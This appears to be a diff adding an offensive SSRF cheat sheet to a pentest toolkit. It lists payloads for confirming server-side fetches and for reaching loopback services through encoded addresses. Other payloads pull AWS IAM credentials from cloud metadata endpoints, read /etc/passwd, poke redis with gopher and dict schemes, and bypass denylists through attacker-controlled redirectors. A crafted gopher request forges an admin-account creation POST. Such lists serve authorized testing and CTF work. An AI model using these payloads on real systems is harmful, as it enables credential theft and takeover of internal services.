@@ -1,0 +1,34 @@
+# SSRF — confirm the fetch, then reach what you shouldn't.
+
+## Confirm (point the feature at your catch-server)
+http://YOUR_IP:PORT/ssrf-probe
+# watch catch-server.py: the User-Agent tells you the fetcher (curl / python-requests / headless chrome / java)
+
+## Reach internal services / loopback (when 127.0.0.1 / localhost are string-blocked)
+http://127.0.0.1/          http://localhost/
+http://0.0.0.0/            http://0/            http://127.1/
+http://[::1]/              http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://127.0.0.2/          http://2130706433/   (decimal)   http://0x7f000001/ (hex)   http://0177.0.0.1/ (octal)
+http://localtest.me/       http://127.0.0.1.nip.io/         (DNS that resolves to loopback)
+
+## Cloud metadata (if hosted)
+http://169.254.169.254/latest/meta-data/                          # AWS IMDSv1
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ # AWS creds
+http://metadata.google.internal/computeMetadata/v1/   (header: Metadata-Flavor: Google)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure (header: Metadata:true)
+
+## Alternate schemes (by fetcher)
+file:///etc/passwd                 # file read if the fetcher allows file://
+dict://127.0.0.1:6379/info         # poke redis/memcached
+gopher://127.0.0.1:6379/_<raw>     # send an arbitrary TCP payload (redis, SMTP, internal HTTP POST)
+ftp://YOUR_IP:PORT/
+
+## Filter / denylist bypass
+# - DNS rebinding or a redirector you control (see scripts/ssrf-redirect.py): submit http://YOUR_IP:PORT/r -> 302 to http://127.0.0.1/admin
+# - Add creds/fragment/@:   http://expected.com@127.0.0.1/   http://127.0.0.1#expected.com   http://127.0.0.1%2523@expected.com
+# - Enclosed alphanumeric / unicode dots:   http://127。0。0。1/
+# - Uppercase scheme, extra slashes:  HTTP://127.0.0.1//
+
+## Forge a POST to an internal create/admin endpoint (curl-based fetchers)
+gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:19%0d%0a%0d%0arole=admin%26id=1
+# build these with gopherus:  gopherus --exploit  (redis / mysql / fastcgi / smtp / internal http)
